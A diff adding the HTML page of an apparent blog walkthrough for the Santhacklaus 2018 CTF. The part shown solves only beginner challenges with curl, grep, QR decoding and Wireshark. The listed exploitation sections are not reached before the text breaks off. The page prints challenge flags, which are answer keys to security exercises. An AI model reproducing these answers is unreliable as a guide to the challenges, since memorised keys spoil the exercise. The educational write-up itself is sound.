@@ -1,0 +1,5207 @@
+<!DOCTYPE html>
+<html lang="">
+	
+	
+
+
+	<head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="Cache-Control" content="public" />
+	<!-- Enable responsiveness on mobile devices -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	
+	    
+	    
+	    
+	
+	<title>Santhacklaus 2018 • Just another infosec blog</title>
+	
+	
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Santhacklaus 2018"/>
+<meta name="twitter:description" content="Individual CTF made by Pinkflood from IMT Lille (France)."/>
+
+	<meta property="og:title" content="Santhacklaus 2018" />
+<meta property="og:description" content="Individual CTF made by Pinkflood from IMT Lille (France)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://maki.bzh/walkthrough/santhacklaus2018/" />
+<meta property="article:published_time" content="2018-12-19T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-12-19T00:00:00&#43;00:00"/>
+
+
+    		
+	
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
+	
+	
+	
+
+	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
+	<link rel="stylesheet" href="/css/custom.css" >
+	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="shortcut icon" href="/favicon.png">
+    	
+
+</head>
+
+
+	<body >
+				
+		<div class="sidebar">
+			<div class="container sidebar-about ">
+				<span class="site__title">
+				
+					<a href=""></a>
+				</span>
+				<a href="https://maki.bzh/">
+					
+					
+					
+					<div class="author-image">
+						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
+					</div>
+					
+				</a>
+				<p class="site__description">
+					<a href="https://maki.bzh/en">
+						
+					</a>
+				</p>
+				<div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/walkthrough/">
+						<span>Walkthrough</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/stupidthings/">
+						<span>Stupid Things</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/ctf/">
+						<span>CTF</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/friends/">
+						<span>Friends</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/whoami/">
+						<span>Who Am I?</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+				
+				<section class="social">
+						
+						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+						
+						
+					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+					  
+</section>
+
+				
+				
+				<p class="copyright">
+					&copy; 2020 Maki.
+					<br/>
+					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+					<br/>Built with, Haax, Laluka, _ACKNAK_
+					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+					
+				</p>
+			</div>
+		</div>
+
+		<div class="content container">
+			
+	<article>
+	<header>
+		<h1>Santhacklaus 2018</h1>
+		
+		
+<div class="post__meta">
+	
+	<i class="fas fa-calendar-alt"></i> Dec 19, 2018
+	
+	
+	<br/>
+	<i class="fas fa-clock"></i> 49 min read
+</div>
+
+
+	</header>
+	<hr/>
+	<div class="post">
+		<nav id="TableOfContents">
+<ul>
+<li><a href="#bonjour">Bonjour</a>
+<ul>
+<li><a href="#statement">Statement</a></li>
+<li><a href="#flag">Flag</a></li>
+</ul></li>
+<li><a href="#i-got-404-problems">I got 404 problems</a>
+<ul>
+<li><a href="#statement-1">Statement</a></li>
+<li><a href="#curling">Curling</a></li>
+<li><a href="#flag-1">Flag</a></li>
+</ul></li>
+<li><a href="#playa-del-fuego">Playa del fuego</a>
+<ul>
+<li><a href="#statement-2">Statement</a></li>
+<li><a href="#copy-paste">Copy &amp; Paste</a></li>
+<li><a href="#flag-2">Flag</a></li>
+</ul></li>
+<li><a href="#trashhack">Trashhack</a>
+<ul>
+<li><a href="#statement-3">Statement</a></li>
+<li><a href="#wrinkle-eyes">Wrinkle eyes</a></li>
+<li><a href="#flag-3">Flag</a></li>
+</ul></li>
+<li><a href="#haystack">Haystack</a>
+<ul>
+<li><a href="#statement-4">Statement</a></li>
+<li><a href="#grep-grep-everywhere">Grep, grep everywhere</a></li>
+<li><a href="#flag-4">Flag</a></li>
+</ul></li>
+<li><a href="#slept-on-the-keyboard">Slept on the keyboard</a>
+<ul>
+<li><a href="#statement-5">Statement</a></li>
+<li><a href="#counting">Counting</a></li>
+<li><a href="#flag-5">Flag</a></li>
+</ul></li>
+<li><a href="#what-s-his-name">What&rsquo;s his name</a>
+<ul>
+<li><a href="#statement-6">Statement</a></li>
+<li><a href="#wireshark-you-said">Wireshark you said?</a></li>
+<li><a href="#flag-6">Flag</a></li>
+</ul></li>
+<li><a href="#authentication-2-0">Authentication 2.0</a>
+<ul>
+<li><a href="#statement-7">Statement</a></li>
+<li><a href="#curling-1">Curling</a></li>
+<li><a href="#flag-7">Flag</a></li>
+</ul></li>
+<li><a href="#xtracted">Xtracted</a>
+<ul>
+<li><a href="#statement-8">Statement</a></li>
+<li><a href="#brainfuck">Brainfuck</a></li>
+<li><a href="#flag-8">Flag</a></li>
+</ul></li>
+<li><a href="#stego101">Stego101</a>
+<ul>
+<li><a href="#statement-9">Statement</a></li>
+<li><a href="#steghide">Steghide</a></li>
+<li><a href="#flag-9">Flag</a></li>
+</ul></li>
+<li><a href="#crackme-1">Crackme_1</a>
+<ul>
+<li><a href="#statement-10">Statement</a></li>
+<li><a href="#ltrace">ltrace</a></li>
+<li><a href="#flag-10">Flag</a></li>
+</ul></li>
+<li><a href="#menthal-arithmetic">Menthal arithmetic</a>
+<ul>
+<li><a href="#statement-11">Statement</a></li>
+<li><a href="#scripting-time">Scripting time</a></li>
+<li><a href="#final-script">Final script</a></li>
+<li><a href="#flag-11">Flag</a></li>
+</ul></li>
+<li><a href="#the-flag-grabber">The flag grabber</a>
+<ul>
+<li><a href="#statement-12">Statement</a></li>
+<li><a href="#javascript-is-amazing">JavaScript is amazing</a></li>
+<li><a href="#flag-12">Flag</a></li>
+</ul></li>
+<li><a href="#on-the-road-again">On the road again</a>
+<ul>
+<li><a href="#statement-13">Statement</a></li>
+<li><a href="#state-of-the-art">State of the art</a></li>
+<li><a href="#hook">Hook</a></li>
+<li><a href="#flag-13">Flag</a></li>
+</ul></li>
+<li><a href="#pong">Pong</a>
+<ul>
+<li><a href="#statement-14">Statement</a></li>
+<li><a href="#state-of-the-art-1">State of the art</a></li>
+<li><a href="#flag-14">Flag</a></li>
+</ul></li>
+<li><a href="#qrencoded">QREncoded</a>
+<ul>
+<li><a href="#statement-15">Statement</a></li>
+<li><a href="#state-of-the-art-2">State of the art</a></li>
+<li><a href="#scripting-time-or-not">Scripting time&hellip; Or not</a></li>
+<li><a href="#flag-15">Flag</a></li>
+</ul></li>
+<li><a href="#love">love.</a>
+<ul>
+<li><a href="#statement-16">Statement</a></li>
+<li><a href="#state-of-the-art-3">State of the art</a></li>
+<li><a href="#inkscape">inkscape</a></li>
+<li><a href="#flag-16">Flag</a></li>
+</ul></li>
+<li><a href="#srht">SRHT</a>
+<ul>
+<li><a href="#statement-17">Statement</a></li>
+<li><a href="#state-of-the-art-4">State of the art</a></li>
+<li><a href="#cookie">Cookie</a></li>
+<li><a href="#curling-again">Curling again</a></li>
+<li><a href="#flag-17">Flag</a></li>
+</ul></li>
+<li><a href="#trollologuess">Trollologuess</a>
+<ul>
+<li><a href="#statement-18">Statement</a></li>
+<li><a href="#state-of-the-art-5">State of the art</a></li>
+<li><a href="#step1">Step1</a></li>
+<li><a href="#step2">Step2</a></li>
+<li><a href="#step3">Step3</a></li>
+<li><a href="#flag-18">Flag</a></li>
+</ul></li>
+<li><a href="#can-you-see-the-flag">Can you SEE the flag</a>
+<ul>
+<li><a href="#statement-19">Statement</a></li>
+<li><a href="#state-of-the-art-6">State of the art</a></li>
+<li><a href="#some-shitty-qr-code">Some shitty QR Code</a></li>
+<li><a href="#extracting-the-sound">Extracting the sound</a></li>
+<li><a href="#flag-19">Flag</a></li>
+</ul></li>
+<li><a href="#some-chinese-stuff-challenge">Some chinese stuff challenge</a>
+<ul>
+<li><a href="#statement-20">Statement</a></li>
+<li><a href="#state-of-the-art-7">State of the art</a></li>
+<li><a href="#counting-1">Counting</a></li>
+<li><a href="#find-and-replace">Find and replace</a></li>
+<li><a href="#final-script-1">Final script</a></li>
+<li><a href="#flag-20">Flag</a></li>
+</ul></li>
+<li><a href="#volatility101">Volatility101</a>
+<ul>
+<li><a href="#statement-21">Statement</a></li>
+<li><a href="#state-of-the-art-8">State of the art</a></li>
+<li><a href="#step-1">Step 1</a>
+<ul>
+<li><a href="#clean-method">Clean method</a></li>
+<li><a href="#dirty-method">Dirty method</a></li>
+</ul></li>
+<li><a href="#step-2">Step 2</a></li>
+<li><a href="#step-3">Step 3</a></li>
+<li><a href="#flag-21">Flag</a></li>
+</ul></li>
+<li><a href="#crackme-2">Crackme_2</a>
+<ul>
+<li><a href="#statement-22">Statement</a></li>
+<li><a href="#state-of-the-art-9">State of the art</a></li>
+<li><a href="#static-analysis">Static &ldquo;analysis&rdquo;</a></li>
+<li><a href="#byte-patching">Byte patching</a></li>
+<li><a href="#flag-22">Flag</a></li>
+</ul></li>
+<li><a href="#jeanclaude-vd">JeanClaude.VD</a>
+<ul>
+<li><a href="#statement-23">Statement</a></li>
+<li><a href="#state-of-the-art-10">State of the art</a></li>
+<li><a href="#curling-all-the-things">Curling all the things</a></li>
+<li><a href="#flag-23">Flag</a></li>
+</ul></li>
+<li><a href="#only-numbers-here">Only numbers here</a>
+<ul>
+<li><a href="#statement-24">Statement</a></li>
+<li><a href="#state-of-the-art-11">State of the art</a></li>
+<li><a href="#find-the-hash">Find the hash</a></li>
+<li><a href="#scripting">Scripting</a></li>
+<li><a href="#flag-24">Flag</a></li>
+</ul></li>
+<li><a href="#be-my-valentine">Be my valentine</a>
+<ul>
+<li><a href="#statement-25">Statement</a></li>
+<li><a href="#state-of-the-art-12">State of the art</a></li>
+<li><a href="#metasploit-time">Metasploit time</a></li>
+<li><a href="#flag-25">Flag</a></li>
+</ul></li>
+<li><a href="#randomscretmessage">RandomScretmessAge</a>
+<ul>
+<li><a href="#statement-26">Statement</a></li>
+<li><a href="#state-of-the-art-13">State of the art</a></li>
+<li><a href="#recover-the-private-key">Recover the private key</a></li>
+<li><a href="#recover-the-secret-key">Recover the secret key</a></li>
+<li><a href="#decrypt-the-file">Decrypt the file</a></li>
+<li><a href="#flag-26">Flag</a></li>
+</ul></li>
+<li><a href="#3d-industry-1-2">3D Industry <sup>1</sup>&frasl;<sub>2</sub></a>
+<ul>
+<li><a href="#statement-27">Statement</a></li>
+<li><a href="#state-of-the-art-14">State of the art</a></li>
+<li><a href="#local-file-inclusion-rce">Local File Inclusion -&gt; RCE</a></li>
+<li><a href="#exploitation">Exploitation</a></li>
+<li><a href="#flag-27">Flag</a></li>
+</ul></li>
+<li><a href="#3d-industry-2-2">3D Industry <sup>2</sup>&frasl;<sub>2</sub></a>
+<ul>
+<li><a href="#statement-28">Statement</a></li>
+<li><a href="#state-of-the-art-15">State of the art</a></li>
+<li><a href="#sensitive-data">Sensitive data</a></li>
+<li><a href="#open-the-stl-data">Open the STL data</a></li>
+<li><a href="#flag-28">Flag</a></li>
+</ul></li>
+<li><a href="#j-l-c-s-v-b-d">J.L.C.S.V.B.D</a>
+<ul>
+<li><a href="#statement-29">Statement</a></li>
+<li><a href="#state-of-the-art-16">State of the art</a></li>
+<li><a href="#extraction">Extraction</a></li>
+<li><a href="#flag-29">Flag</a></li>
+</ul></li>
+<li><a href="#bret-stiles">Bret Stiles</a>
+<ul>
+<li><a href="#statement-30">Statement</a></li>
+<li><a href="#state-of-the-art-17">State of the art</a></li>
+<li><a href="#find-the-right-profile">Find the right profile</a></li>
+<li><a href="#file-list">File list</a></li>
+<li><a href="#process-memory-dump-in-gimp">Process memory dump in GIMP</a></li>
+<li><a href="#flag-30">Flag</a></li>
+<li><a href="#fun-fact">Fun fact</a></li>
+</ul></li>
+<li><a href="#netrunner-1-3">NetRunner <sup>1</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-31">Statement</a></li>
+<li><a href="#state-of-the-art-18">State of the art</a></li>
+<li><a href="#bypass">Bypass</a></li>
+<li><a href="#flag-31">Flag</a></li>
+</ul></li>
+<li><a href="#netrunner-2-3">NetRunner <sup>2</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-32">Statement</a></li>
+<li><a href="#state-of-the-art-19">State of the art</a></li>
+<li><a href="#exploitation-1">Exploitation</a></li>
+<li><a href="#flag-32">Flag</a></li>
+</ul></li>
+<li><a href="#netrunner-3-3">NetRunner <sup>3</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-33">Statement</a></li>
+<li><a href="#state-of-the-art-20">State of the art</a></li>
+<li><a href="#sudo-misconfigured">Sudo misconfigured</a></li>
+<li><a href="#exploit">Exploit</a></li>
+<li><a href="#flag-33">Flag</a></li>
+</ul></li>
+<li><a href="#archdrive-1-3">ArchDrive <sup>1</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-34">Statement</a></li>
+<li><a href="#state-of-the-art-21">State of the art</a></li>
+<li><a href="#basic-local-file-inclusion">Basic local file inclusion</a></li>
+<li><a href="#flag-34">Flag</a></li>
+</ul></li>
+<li><a href="#archdrive-2-3">ArchDrive <sup>2</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-35">Statement</a></li>
+<li><a href="#state-of-the-art-22">State of the art</a></li>
+<li><a href="#local-file-inclusion">Local file inclusion</a></li>
+<li><a href="#file-extraction">File extraction</a></li>
+<li><a href="#bruteforce-time">Bruteforce time</a></li>
+<li><a href="#flag-35">Flag</a></li>
+</ul></li>
+<li><a href="#archdrive-3-3">ArchDrive <sup>3</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-36">Statement</a></li>
+<li><a href="#state-of-the-art-23">State of the art</a></li>
+<li><a href="#decrypting-and-mounting">Decrypting and mounting</a></li>
+<li><a href="#hidden-volume">Hidden volume</a></li>
+<li><a href="#flag-36">Flag</a></li>
+</ul></li>
+<li><a href="#archdrive-4-3">ArchDrive <sup>4</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-37">Statement</a></li>
+<li><a href="#state-of-the-art-24">State of the art</a></li>
+<li><a href="#tor-browsing-buying-drugs">Tor browsing (BUYING DRUGS)</a></li>
+<li><a href="#xxe-oob">XXE OOB</a></li>
+<li><a href="#file-extraction-1">File extraction</a></li>
+<li><a href="#ssh-connection">SSH connection</a></li>
+<li><a href="#flag-37">Flag</a></li>
+</ul></li>
+<li><a href="#archdrive-5-3">ArchDrive <sup>5</sup>&frasl;<sub>3</sub></a>
+<ul>
+<li><a href="#statement-38">Statement</a></li>
+<li><a href="#state-of-the-art-25">State of the art</a></li>
+<li><a href="#exploit-1">Exploit</a></li>
+<li><a href="#flag-38">Flag</a></li>
+</ul></li>
+<li><a href="#mission-impossible-1">Mission impossible 1</a>
+<ul>
+<li><a href="#statement-39">Statement</a></li>
+<li><a href="#state-of-the-art-26">State of the art</a></li>
+<li><a href="#profile-generation">Profile generation</a></li>
+<li><a href="#raiders-of-the-lost-zip">Raiders of the Lost Zip</a></li>
+<li><a href="#flag-39">Flag</a></li>
+</ul></li>
+<li><a href="#mission-impossible-2">Mission impossible 2</a>
+<ul>
+<li><a href="#statement-40">Statement</a></li>
+<li><a href="#state-of-the-art-27">State of the art</a></li>
+<li><a href="#how-det-works">How DET works?</a></li>
+<li><a href="#how-data-are-exfiltrated">How data are exfiltrated?</a></li>
+<li><a href="#scripting-and-decryption-time">Scripting and decryption time</a></li>
+<li><a href="#flag-40">Flag</a></li>
+</ul></li>
+</ul>
+</nav>
+		
+
+<h1 id="bonjour">Bonjour</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Bonjour</td>
+<td>Rules</td>
+<td>0</td>
+<td>400</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_bonjour.png" alt="" />
+<em>Fig 1</em>: Bonjour statement
+</center></p>
+
+<h2 id="flag">Flag</h2>
+
+<p>This challenge is maybe the hardest one. You have to copy and paste the right flag!</p>
+
+<blockquote>
+<p>IMTLD{BaguetteForXMAS}</p>
+</blockquote>
+
+<h1 id="i-got-404-problems">I got 404 problems</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>I got 404 problems</td>
+<td>Web</td>
+<td>50</td>
+<td>~ 300</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-1">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_404.png" alt="" />
+<em>Fig 1</em>: &ldquo;I got 404 problems&rdquo; statement
+</center></p>
+
+<h2 id="curling">Curling</h2>
+
+<p>Just go on 404 Not Found page:</p>
+
+<pre><code class="language-bash">curl &quot;https://santhacklaus.xyz/bitedepoulet&quot; | grep IMT
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4469  100  4469    0     0      0      0 --&lt;p class=&quot;text-center&quot; style=&quot;color:#999999;&quot;&gt;&lt;/br&gt;IMTLD{Th3_P4g3_w4s_n0T_f0uNd}&lt;/br&gt;&lt;/p&gt;
+100  4469  100  4469    0     0    745      0  0:00:05  0:00:05 --:--:--   985
+</code></pre>
+
+<h2 id="flag-1">Flag</h2>
+
+<p>Then the flag:</p>
+
+<blockquote>
+<p>IMTLD{Th3_P4g3_w4s_n0T_f0uNd}</p>
+</blockquote>
+
+<h1 id="playa-del-fuego">Playa del fuego</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Playa del fuego</td>
+<td>Forensic</td>
+<td>50</td>
+<td>~ 300</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-2">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_playa.png" alt="" />
+<em>Fig 1</em>: &ldquo;Playa del fuego&rdquo; statement
+</center></p>
+
+<h2 id="copy-paste">Copy &amp; Paste</h2>
+
+<p>I just opened the PDF file, and saw the little black rectangle at the bottom&hellip;</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/playa1.png" alt="" />
+<em>Fig 1</em>: &ldquo;Playa del fuego&rdquo; statement
+</center></p>
+
+<p>Tried <code>CTRL-A / CTRL-C / CTRL-V</code> in my favorite text editor, and voila!</p>
+
+<h2 id="flag-2">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Bl4ck_0n_Bl4ck_isAbadIDEA}</p>
+</blockquote>
+
+<h1 id="trashhack">Trashhack</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Trashhack</td>
+<td>Non-Dgitial Forensic</td>
+<td>50</td>
+<td>~ 200</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-3">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_trashhack.png" alt="" />
+<em>Fig 1</em>: &ldquo;Trashhack&rdquo; statement
+</center></p>
+
+<h2 id="wrinkle-eyes">Wrinkle eyes</h2>
+
+<p>In this challenge, we&rsquo;re starting with this picture:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/trashhack1.jpg" alt="" />
+<em>Fig 2</em>: Piece of paper found in trash
+</center></p>
+
+<h2 id="flag-3">Flag</h2>
+
+<p>If you read carrefuly you&rsquo;re able to see:</p>
+
+<blockquote>
+<p>IMTLD{P4P3R}</p>
+</blockquote>
+
+<h1 id="haystack">Haystack</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Haystack</td>
+<td>Rules</td>
+<td>50</td>
+<td>~ 200</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-4">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_haystack.png" alt="" />
+<em>Fig 1</em>: &ldquo;Haystack&rdquo; statement
+</center></p>
+
+<h2 id="grep-grep-everywhere">Grep, grep everywhere</h2>
+
+<p>We&rsquo;re starting with this kind of text file:</p>
+
+<pre><code class="language-raw">IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD(0e19c81165be3fd14916bc296eff592b)
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD(0e19c81165be3fd14916bc296eff592b)
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD(0e19c81165be3fd14916bc296eff592b)
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD(0e19c81165be3fd14916bc296eff592b)
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD(0e19c81165be3fd14916bc296eff592b)
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+IMTLD(0e19c81165be3fd14916bc296eff592b)
+IMTLD{bde443a465e270719a63065a496cbf8e]
+IMTLD9f553b427052a3e4d484532eed0d80da
+[...]
+</code></pre>
+
+<p>After downloading this file, just grep with the right flag format:</p>
+
+<pre><code class="language-bash">cat a.txt| grep 'IMTLD{' | grep '}'
+</code></pre>
+
+<h2 id="flag-4">Flag</h2>
+
+<blockquote>
+<p>IMTLD{26650fdec09ef3ac4b602a79a0384306}</p>
+</blockquote>
+
+<h1 id="slept-on-the-keyboard">Slept on the keyboard</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Slept on the keyboard</td>
+<td>Crypto</td>
+<td>100</td>
+<td>~ 200</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-5">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_sleptkeyboard.png" alt="" />
+<em>Fig 1</em>: &ldquo;Slept on the keyboard&rdquo; statement
+</center></p>
+
+<h2 id="counting">Counting</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/qrcode_1.png" alt="" />
+<em>Fig 2</em>: QRCode
+</center></p>
+
+<p>Decoding time, the QR Code give us binary number. With the following perl command found on stackoverflow, I was able to convert binary to ascii:</p>
+
+<pre><code class="language-bash">zbarimg -q --raw qrcode.png | perl -lpe '$_=pack&quot;B*&quot;,$_'
+9999dddd44444cccc4444bbbbbbb33334444444444000eeeeee44444888888333bbbb33399999992222220004442222222444444ddddddd
+</code></pre>
+
+<p>At this time, it tooks me several minutes to understand what I had to do. In fact, the solution is quite easy: just count.</p>
+
+<ul>
+<li>9999 -&gt; 49</li>
+<li>dddd -&gt; 4d</li>
+<li>44444 -&gt; 54</li>
+<li>cccc -&gt; 4c</li>
+<li>4444 -&gt; 44</li>
+</ul>
+
+<pre><code class="language-bash">echo -n '494d544c44' | xxd -r -p
+IMTLD 
+</code></pre>
+
+<h2 id="flag-5">Flag</h2>
+
+<pre><code class="language-bash">echo -n '494d544c447b433474306e5468334b337962303472647d' | xxd -r -p
+IMTLD{C4t0nTh3K3yb04rd}
+</code></pre>
+
+<h1 id="what-s-his-name">What&rsquo;s his name</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>What&rsquo;s his name</td>
+<td>Rules</td>
+<td>100</td>
+<td>~ 150</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-6">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_name.png" alt="" />
+<em>Fig 1</em>: &ldquo;What&rsquo;s his name&rdquo; statement
+</center></p>
+
+<h2 id="wireshark-you-said">Wireshark you said?</h2>
+
+<p>Just open the PCAP file in Wireshark and then <code>Follow TCP stream</code>:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/name1.png" alt="" />
+<em>Fig 2</em>: &ldquo;What&rsquo;s his name&rdquo; statement
+</center></p>
+
+<h2 id="flag-6">Flag</h2>
+
+<blockquote>
+<p>IMTLD{W4tch4_W4tch4}</p>
+</blockquote>
+
+<h1 id="authentication-2-0">Authentication 2.0</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Authentication 2.0</td>
+<td>Web</td>
+<td>100</td>
+<td>~ 150</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-7">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_auth20.png" alt="" />
+<em>Fig 1</em>: &ldquo;Authentication 2.0&rdquo; statement
+</center></p>
+
+<h2 id="curling-1">Curling</h2>
+
+<p>So, on the above link we found:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/auth20_1.png" alt="" />
